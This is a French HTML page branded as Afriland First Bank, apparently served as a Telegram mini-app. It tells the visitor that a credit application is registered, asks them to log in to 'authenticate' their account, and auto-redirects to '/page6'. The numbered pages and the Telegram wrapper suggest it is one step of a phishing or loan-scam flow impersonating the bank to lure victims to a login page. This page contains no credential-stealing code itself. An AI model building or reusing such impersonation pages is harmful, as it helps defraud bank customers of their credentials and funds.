<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Demande Soumise - Afriland First Bank</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --purple-primary: #6b21a8; --bg-color: #f3f4f6; }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        .card { background: white; width: 90%; max-width: 420px; padding: 40px 24px; border-radius: 24px; text-align: center; box-shadow: 0 6px 25px rgba(0,0,0,0.05); }
        .check-circle { width: 80px; height: 80px; background-color: var(--purple-primary); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; color: white; font-size: 36px; font-weight: bold; }
        .main-title { font-size: 24px; color: var(--purple-primary); margin-bottom: 15px; font-weight: 800; }
        .message-text { color: #4b5563; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
        .btn-outline { background: transparent; border: 1px solid #d1d5db; width: 100%; padding: 14px; border-radius: 10px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>
<div class="card">
    <div class="check-circle">✓</div>
    <h1 class="main-title">Dossier Enregistré</h1>
    <p class="message-text">Votre demande de crédit a été enregistrée avec succès. Veuillez vous connecter pour authentifier votre compte.</p>
    <button class="btn-outline" onclick="location.href='/page6'">Se connecter à mon compte</button>
</div>

<script>
    setTimeout(() => { window.location.href = "/page6"; }, 3500);
</script>
</body>
</html>
